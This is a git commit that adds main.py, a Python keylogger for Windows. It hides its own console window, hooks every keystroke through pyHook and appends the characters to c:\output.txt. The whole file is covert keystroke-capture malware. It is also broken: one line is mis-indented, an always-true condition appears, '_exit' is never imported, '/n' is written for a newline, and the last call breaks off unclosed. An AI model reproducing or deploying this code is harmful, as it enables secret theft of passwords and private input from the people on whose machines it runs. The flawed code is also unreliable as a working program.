854991591c3a04104aeca3d9dbf6899c95ff76a6
NandyDark <58636468+nandydark@users.noreply.github.com>
2021-04-05 14:31:18 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,29 @@
+import win32api
+import win32console
+import win32gui
+import pythoncom, pyHook
+  
+thewindows = win32console.GetConsoleWindow()
+win32gui.ShowWindow(thewindows, 0)
+  
+def OnKeyboardEvent(event):
+    if event.Ascii==5:
+        _exit(1)
+    if event.Ascii !=0 or 8:
+        f = open('c:\output.txt', 'r+')
+        buffer = f.read()
+        f.close()
+        f = open('c:\output.txt', 'w')
+        keylogs = chr(event.Ascii)
+        if event.Ascii == 13:
+        keylogs = '/n'
+        buffer += keylogs
+        f.write(buffer)
+        f.close()
+# Creating a hook manager object
+hm = pyHook.HookManager()
+hm.KeyDown = OnKeyboardEvent
+# Setting up the hook
+hm.HookKeyboard()
+# Timeline
+pythoncom.PumpMessages(
